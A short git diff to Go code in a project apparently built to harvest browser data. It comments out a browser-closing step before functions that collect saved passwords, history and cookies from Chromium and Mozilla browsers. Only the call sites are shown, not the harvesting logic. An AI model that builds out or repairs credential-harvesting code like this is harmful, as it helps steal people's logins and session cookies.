@@ -9,7 +9,6 @@ import (
 	"kdot/kematian/browsers/chromium/passChromium"
 	"kdot/kematian/browsers/mozilla/cookiesMozilla"
 	"kdot/kematian/browsers/structs"
-	"kdot/kematian/browsers/util"
 	"os"
 )
 
@@ -45,7 +44,7 @@ func GetBrowserDownloads(browsers []structs.Browser) {
 }
 
 func GetBrowserData(totalBrowsers []structs.Browser) {
-	util.CloseBrowsers()
+	//util.CloseBrowsers()
 	GetBrowserPasswords(totalBrowsers)
 	GetBrowserHistory(totalBrowsers)
 	GetBrowserCookies(totalBrowsers)
